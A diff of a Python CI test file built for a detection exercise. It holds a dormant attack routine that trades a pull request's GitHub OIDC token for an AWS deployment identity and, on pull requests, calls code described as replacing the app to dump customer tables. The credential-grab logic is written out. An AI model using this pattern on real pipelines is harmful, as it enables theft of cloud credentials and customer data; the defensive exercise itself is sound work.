@@ -1,16 +1,17 @@
-"""PR-editable test entrypoint for the detection exercise.
+"""PR-run test entrypoint for the detection exercise.
 
-This file stands in for attacker-controlled code that runs in CI. In the real scenario an
-attacker who stole a developer's AI-coding-agent GitHub token edits a build/test script in a
-pull request; the PR's automated tests execute it *before* anyone reviews the change.
+This file stands in for attacker-controllable code that a pull request executes in CI before
+anyone reviews it. By default it is harmless: `main()` runs `smoke_check()` and nothing else. The
+exploit is pre-written in `run_attack()`, but its call in `main()` is shipped **commented out** —
+a stand-in for code an attacker authored but has not yet unleashed.
 
-It ships DISARMED (ARMED = False) and does nothing until a pull request flips that one line —
-standing in for an attacker arming a payload they authored. Once armed:
-  - Always: obtain the AWS "deployment" identity by exchanging the job's GitHub OIDC token
-    (this is the credential grab the detection detector watches for).
-  - On a pull request only: use that identity to carry out the rest of the attack in CI —
-    replace the running app with a container that dumps the customer tables, print what it
-    stole, then restore the app.
+The two demo actions, both on this one file:
+  - Legitimate change: edit the `PROBE_NOTE` value. The attack call stays commented, so the PR's
+    CI run does only the smoke check and touches no AWS — the vulnerability exists, but nothing
+    exercises it.
+  - Attack: uncomment the `run_attack()` call. Now the PR's CI run grabs the AWS "deployment"
+    identity and, on a pull request, replaces the app with a container that dumps the customer
+    tables, prints what it stole, then restores the app.
 
 Everything is synthetic data in an owned sandbox; nothing leaves the cluster.
 """
@@ -27,12 +28,9 @@ import boto3
 from botocore import UNSIGNED
 from botocore.config import Config
 
-# Shipped False so the payload below is dormant. An unreviewed PR flips this to True to arm it —
-# the single meaningful change in the attack. Set back to False to disarm.
-ARMED = False
-
-# A no-op string the attacker can bump to trigger a fresh CI run while the payload stays armed.
-MARKER = "original-harmless-probe"
+# The one harmless value a legitimate pull request edits (Step 1 of the demo). Changing it forces
+# a fresh CI run and nothing else; it never affects what the probe does.
+PROBE_NOTE = "ok"
 
 # -- Payload that runs INSIDE the hijacked app pod -----------------------------------------------
 # It runs as the app's own identity (via EKS Pod Identity), which has read access to the tables.
@@ -133,33 +131,41 @@ def exploit(credentials: dict, region: str):
     print("Restored the legitimate app.", flush=True)
 
 
-def main():
-    # The payload is shipped disarmed. A real attacker would author it themselves; here it is
-    # pre-built and dormant, so arming it is the one-line change an unreviewed PR makes.
-    if not ARMED:
-        print(json.dumps({"marker": MARKER, "status": "probe disarmed; no identity requested"}),
-              flush=True)
-        return
+def smoke_check() -> None:
+    """The probe's only legitimate behavior: print a status line. A normal PR runs just this."""
+    print(json.dumps({"probe_note": PROBE_NOTE, "status": "ok",
+                      "checked_utc": datetime.now(UTC).isoformat()}), flush=True)
 
+
+def run_attack() -> None:
+    """Pre-authored exploit, shipped with its call in main() commented out.
+
+    Grabs the deployment identity (the credential grab the detector watches for) and, on a pull
+    request, uses it to read the customer tables — exploiting access that already exists. On main
+    (a trusted release context) it only proves the identity was obtained, never touching the app.
+    """
     region = os.environ.get("AWS_REGION", "us-east-1")
-
-    # Step A — the credential grab (once armed). Fails with AccessDenied once the trust is fixed.
     credentials = obtain_identity(region)
     identity = boto3.client(
         "sts", region_name=region, aws_access_key_id=credentials["AccessKeyId"],
         aws_secret_access_key=credentials["SecretAccessKey"],
         aws_session_token=credentials["SessionToken"]).get_caller_identity()
-    print(json.dumps({"marker": MARKER, "obtained_identity": identity["Arn"],
+    print(json.dumps({"obtained_identity": identity["Arn"],
                       "attempt_utc": datetime.now(UTC).isoformat()}), flush=True)
-
-    # Step B — the rest of the attack, only when this is a pull request. On main (a trusted
-    # release context) we never touch the app; we only prove the identity was obtained.
     if os.environ.get("GITHUB_EVENT_NAME") == "pull_request":
         print("PR context: using the stolen identity to replace the app and dump the tables.",
               flush=True)
         exploit(credentials, region)
     else:
         print("Non-PR context: identity proof only; not modifying the app.", flush=True)
+
+
+def main():
+    smoke_check()
+
+    # ATTACK (shipped commented out): an attacker uncomments the next line in their PR to unleash
+    # the pre-authored exploit above. A legitimate change leaves it commented.
+    # run_attack()
 
 
 if __name__ == "__main__":
